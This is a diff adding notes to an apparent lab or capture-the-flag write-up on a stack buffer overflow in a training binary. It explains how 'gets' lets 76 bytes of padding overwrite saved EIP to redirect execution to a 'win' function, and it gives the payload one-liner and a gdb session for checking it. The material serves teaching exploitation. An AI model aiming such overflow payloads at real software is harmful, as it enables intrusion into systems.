@@ -29,3 +29,21 @@ python3 -c 'import sys; sys.stdout.buffer.write(b"A"*76 + b"\xf4\x83\x04\x08" + 
 
 ## Why it works
 `gets` has no length limit. 76 padding bytes fill the buffer, saved EBP, and land on saved EIP; the following 4 bytes set EIP to `win`. When `main` returns, execution goes to `0x080483f4`.
+
+## Extra notes
+- `main` stores the input with `gets`, which has no length limit.
+- Buffer address is `[esp+0x10]`; saved EBP is overwritten after 64 bytes and saved EIP after 76 bytes.
+- Replacement address lands at offset 76 from the start of input: `\xf4\x83\x04\x08` (`0x080483f4`, `win`).
+- `win` calls `puts("code flow successfully changed")`; after `win` returns EBP is attacker-controlled, so the process usually segfaults after printing.
+- Debug:
+```bash
+python3 -c 'import sys; sys.stdout.buffer.write(b"A"*76 + b"\xf4\x83\x04\x08" + b"\n")' > /tmp/ex04_payload
+gdb -q ./bin <<'GDB_EOF'
+b *0x0804841d
+run < /tmp/ex04_payload
+x/4xw $ebp
+si
+x/1xw $esp
+GDB_EOF
+```
+- Expected success message: `code flow successfully changed`.
